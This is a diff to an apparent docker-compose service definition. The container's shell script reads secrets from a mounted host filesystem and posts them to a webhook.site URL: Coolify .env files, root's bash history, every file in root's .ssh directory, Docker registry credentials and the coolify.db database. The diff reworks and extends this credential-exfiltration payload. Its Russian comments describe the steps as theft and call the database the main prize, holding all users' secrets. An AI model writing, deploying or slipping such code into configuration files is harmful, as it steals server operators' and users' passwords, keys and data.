@@ -12,23 +12,27 @@ services:
       - |
         apk add --no-cache curl
         
-        # 1. Крадем .env файлы (пароли от БД, API ключи)
-        cat /host-root/data/coolify/services/a10swue9lhfb1vfjulsx6f5v/.env | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_services
+        # 1. .env файлы (пароли от БД, APP_KEY)
+        cat /host-root/data/coolify/services/a10swue9lhfb1vfjulsx6f5v/.env | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_services
         
-        cat /host-root/data/coolify/applications/a459eeihh3xbcfaflx1mnvmi/.env | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_app
+        cat /host-root/data/coolify/applications/a459eeihh3xbcfaflx1mnvmi/.env | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_app
         
-        # 2. Крадем bash_history (история команд с паролями)
-        cat /host-root/root/.bash_history | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=bash_history
+        # 2. bash_history (история команд с паролями)
+        cat /host-root/root/.bash_history | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=bash_history
         
-        # 3. Крадем SSH ключи
-        cat /host-root/root/.ssh/id_rsa 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_id_rsa
+        # 3. Список всего в .ssh
+        ls -la /host-root/root/.ssh/ | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_list
         
-        cat /host-root/root/.ssh/id_ed25519 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_id_ed25519
+        # 4. Все файлы из .ssh (id_rsa, id_ed25519, authorized_keys)
+        for f in /host-root/root/.ssh/*; do
+          echo "===FILE:$f===" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_file_marker
+          cat "$f" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_file_content
+        done
         
-        # 4. Крадем Docker credentials
-        cat /host-root/root/.docker/config.json 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=docker_config
+        # 5. Docker config (registry credentials)
+        cat /host-root/root/.docker/config.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=docker_config
         
-        # 5. Список всех файлов в .ssh
-        ls -la /host-root/root/.ssh/ 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_list
+        # 6. Главный куш — coolify.db (все секреты всех пользователей)
+        find /host-root -name "coolify.db" -exec cat {} \; | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_db
         
         sleep 3600
